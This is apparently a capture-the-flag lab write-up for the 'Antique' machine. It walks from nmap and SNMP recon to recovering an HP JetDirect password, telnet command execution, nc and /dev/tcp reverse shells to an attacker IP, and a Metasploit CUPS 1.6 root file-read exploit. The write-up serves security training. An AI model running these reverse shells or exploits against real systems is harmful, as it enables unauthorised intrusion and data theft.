# Antique (Easy - Linux)

## Recon
### Nmap (TCP)
```console
# nmap -Pn --open -sC -sV -p- 10.10.11.107
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-30 02:31 GMT
Nmap scan report for 10.10.11.107
Host is up (0.024s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
23/tcp open  telnet?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: 
|     JetDirect
|     Password:
|   NULL: 
|_    JetDirect
```
* 23/TCP - Telnet but it requires a password for login

### Nmap (161/UDP)
```console
# nmap -Pn --open -sU -p161 10.10.11.107                                            130 ⨯
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-30 03:07 GMT
Nmap scan report for 10.10.11.107
Host is up.

PORT    STATE         SERVICE
161/udp open|filtered snmp

Nmap done: 1 IP address (1 host up) scanned in 2.14 seconds
```

## Initial Access
### HP JetDirect (Password Retrieve)
* https://www.irongeek.com/i.php?page=security/networkprinterhacking

```console
# snmpwalk -v 1 -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0 
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135
```

Converting Hex to ASCII:
```python
hex_str = "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33" 

# convert hex string to ASCII string
bytes_array = bytes.fromhex(hex_str)
ascii_str = bytes_array.decode()

# printing ASCII string
print(ascii_str)
```

Retrieving the password:
```console
# python3 hex_exploit.py
P@ssw0rd@123!!123
```

### HP JetDriect (Telnet Login)
```console
# telnet 10.10.11.107
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect

Password: P@ssw0rd@123!!123

Please type "?" for HELP
> ?

To Change/Configure Parameters Enter:
Parameter-name: value <Carriage Return>

Parameter-name Type of value
ip: IP-address in dotted notation
subnet-mask: address in dotted notation (enter 0 for default)
default-gw: address in dotted notation (enter 0 for default)
syslog-svr: address in dotted notation (enter 0 for default)
idle-timeout: seconds in integers
set-cmnty-name: alpha-numeric string (32 chars max)
host-name: alpha-numeric string (upper case only, 32 chars max)
dhcp-config: 0 to disable, 1 to enable
allow: <ip> [mask] (0 to clear, list to display, 10 max)

addrawport: <TCP port num> (<TCP port num> 3000-9000)
deleterawport: <TCP port num>
listrawport: (No parameter required)

exec: execute system commands (exec id)
exit: quit from telnet session
> exec id
uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)
> exec ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.107  netmask 255.255.254.0  broadcast 10.10.11.255
        inet6 fe80::250:56ff:feb9:a4cd  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:a4:cd  txqueuelen 1000  (Ethernet)
        RX packets 67861  bytes 4092936 (4.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 68375  bytes 3759137 (3.7 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

### Reverse Shell
```bash
exec rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9001 >/tmp/f
```

### user.txt
```console
# nc -lvnp 9001                   
listening on [any] 9001 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.107] 43382
/bin/sh: 0: can't access tty; job control turned off
$ ls -la
total 16
drwxr-xr-x 2 lp   lp   4096 Sep 27 07:12 .
drwxr-xr-x 6 root root 4096 May 14  2021 ..
lrwxrwxrwx 1 lp   lp      9 May 14  2021 .bash_history -> /dev/null
-rwxr-xr-x 1 lp   lp   1959 Sep 27 07:12 telnet.py
-rwxrwxrwx 1 lp   lp     33 Nov 30 02:24 user.txt
$ cat user.txt
3690**REDACTED**3c08e
```

## Privesc (lp --> root)
### socat (631/TCP)
```console
lp@antique:~$ netstat -tulpn 
netstat -tulpn 
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      816/python3         
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 ::1:631                 :::*                    LISTEN      -                   
udp        0      0 0.0.0.0:161             0.0.0.0:*                           -                   
lp@antique:~$ 

lp@antique:~$ socat tcp-listen:9002,fork tcp:127.0.0.1:631 &
socat tcp-listen:9002,fork tcp:127.0.0.1:631 &
[1] 3166
lp@antique:~$ netstat -tulpn
netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:9002            0.0.0.0:*               LISTEN      3166/socat          
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      816/python3         
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 ::1:631                 :::*                    LISTEN      -                   
udp        0      0 0.0.0.0:161             0.0.0.0:*                           -                   
lp@antique:~$ 
```

### Nmap (631/TCP)
```console
# nmap -Pn --open -p9002 -sC -sV 10.10.11.107
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-30 03:51 GMT
Nmap scan report for 10.10.11.107
Host is up (0.0085s latency).

PORT     STATE SERVICE VERSION
9002/tcp open  ipp     CUPS 1.6
|_http-server-header: CUPS/1.6
|_http-title: Bad Request - CUPS v1.6.1
```

### CUPS 1.6 LPE
CUPS 1.6 is vulnerable to local privilage escalation. 

msfconsole Multi-handler setup:
```console
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x64/shell_reverse_tcp
payload => linux/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.2
LHOST => 10.10.14.2
msf6 exploit(multi/handler) > set LPORT 9003
LPORT => 9003
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.2:9003
```

Bind shell from the `lp` user
```console
/bin/bash -i >& /dev/tcp/10.10.14.2/9003 0>&1
```

```console
Background session 1? [y/N]  y
msf6 exploit(multi/handler) > sessions -i

Active sessions
===============

  Id  Name  Type             Information  Connection
  --  ----  ----             -----------  ----------
  1         shell x64/linux               10.10.14.2:9003 -> 10.10.11.107:43680 (10.10.11.107)
```

Running CUPS 1.6 LPE exploit
```console
msf6 exploit(multi/handler) > use multi/escalate/cups_root_file_read
msf6 post(multi/escalate/cups_root_file_read) > set session 1
session => 1
msf6 post(multi/escalate/cups_root_file_read) > options

Module options (post/multi/escalate/cups_root_file_read):

   Name       Current Setting          Required  Description
   ----       ---------------          --------  -----------
   ERROR_LOG  /var/log/cups/error_log  yes       The original path to the CUPS error log
   FILE       /etc/shadow              yes       The file to steal.
   SESSION    1                        yes       The session to run this module on.

msf6 post(multi/escalate/cups_root_file_read) > set FILE /root/root.txt
FILE => /root/root.txt
msf6 post(multi/escalate/cups_root_file_read) > run

[!] SESSION may not be compatible with this module (incompatible session type: shell)
[+] User in lpadmin group, continuing...
[+] cupsctl binary found in $PATH
[+] nc binary found in $PATH
[*] Found CUPS 1.6.1
[+] File /root/root.txt (32 bytes) saved to /root/.msf4/loot/20211130042047_default_10.10.11.107_cups_file_read_308853.txt
[*] Cleaning up...
[*] Post module execution completed
```

### root.txt
```
# cat /root/.msf4/loot/20211130042047_default_10.10.11.107_cups_file_read_308853.txt
9023**REDACTED**e057b
```

